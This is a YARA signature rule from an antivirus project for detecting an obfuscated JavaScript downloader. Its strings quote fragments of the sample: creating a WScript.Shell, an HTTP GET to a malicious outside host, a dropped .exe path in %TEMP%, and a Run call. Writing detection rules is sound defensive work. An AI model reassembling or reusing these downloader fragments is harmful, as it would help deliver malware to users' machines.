rule sig_20160328_a541855e42c79aed7c59c7b06dba21ad {
  meta:
    description = "datamaliciousorder - file 20160328_a541855e42c79aed7c59c7b06dba21ad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f7835adae6f5fa829be1cc37dfae486f67db07bdd78346edd8e88267384b5cec"

  strings:
    $s1  = "function Eqmmtnxpo() {return Odwdqkn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qJnx5cyaDS7.exe\";};" fullword ascii
    $s2  = "do {WScript[Mauhbl](Vpneqvbr() * 11)} while (Mcivlkj[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Usrzkn(Cdohuskum, Tmxmczaufn){return Cdohuskum - Tmxmczaufn;};" fullword ascii
    $s4  = "var Odwdqkn = function Ooosdu() {return WScript[Nlebvujo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Mcivlkj[Wbfhcxpk](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s6  = "function Gzhwtpc(Eiosm){Odwdqkn[\"Run\"](Eiosm, Vixqlozwk, Vixqlozwk);};" fullword ascii
    $s7  = "function Ztgskef() {return ((Bzmtmocyc == true) && (Bzmtmocyc == Rrybggfswz)) ? 1 : Vixqlozwk;};" fullword ascii
    $s8  = "Bzmtmocyc = true; " fullword ascii
    $s9  = "function Chaexqgwxv(Wfughc) {var Qgfhauwk = (1, 2, 3, 4, 5, Wfughc); return Qgfhauwk;};" fullword ascii
    $s10 = "function Vpneqvbr(){return 22;};" fullword ascii
    $s11 = "function Jasmpgbexx()" fullword ascii
    $s12 = "var Bpechrhte = false;" fullword ascii
    $s13 = "return Usrzkn(Xggxeobpaz, Pxljc);" fullword ascii
    $s14 = "function Tocwrdp(){return Nlebvujo;};" fullword ascii
    $s15 = " while (Tjkga){" fullword ascii
    $s16 = "var Rrybggfswz = false;" fullword ascii
    $s17 = "var Hbizwgi = new this[\"Date\"]();" fullword ascii
    $s18 = "function Rdrchcor(){return Vguibgaxeq;};" fullword ascii
    $s19 = "Rrybggfswz = true; " fullword ascii
    $s20 = "var Bzmtmocyc = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}